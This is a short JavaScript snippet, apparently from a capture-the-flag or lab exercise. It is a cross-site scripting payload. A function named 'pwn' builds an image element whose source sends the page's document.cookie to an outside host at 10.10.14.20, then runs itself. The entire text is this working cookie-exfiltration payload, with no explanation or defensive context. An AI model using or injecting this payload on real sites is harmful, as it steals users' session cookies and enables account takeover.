function pwn() {
    var img = document.createElement("img");
    img.src = "http://10.10.14.20/xss?=" + document.cookie;
    document.body.appendChild(img);
}
pwn();

